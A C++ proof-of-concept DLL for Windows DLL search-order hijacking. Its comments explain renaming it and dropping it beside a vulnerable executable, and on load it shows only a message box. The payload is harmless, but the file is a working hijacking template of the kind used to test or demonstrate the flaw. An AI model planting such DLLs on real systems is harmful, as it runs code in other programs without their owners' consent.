// PoC_Malicious_DLL.cpp
// This DLL will pop-up a message box when loaded by any binary
// Rename the compiled DLL with the DLL you would like to load by exploiting DLL search order vulnerability 
// and place it in the vulnerable executable folder

#include<Windows.h>
#include "stdafx.h"
#include <tchar.h>

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        MessageBox(NULL, _T("PoC malicious DLL called. (Reason: DLL_PROCESS_ATTACH)"), _T("message"), MB_OK | MB_SYSTEMMODAL);
        break;
    /*
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    */

    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
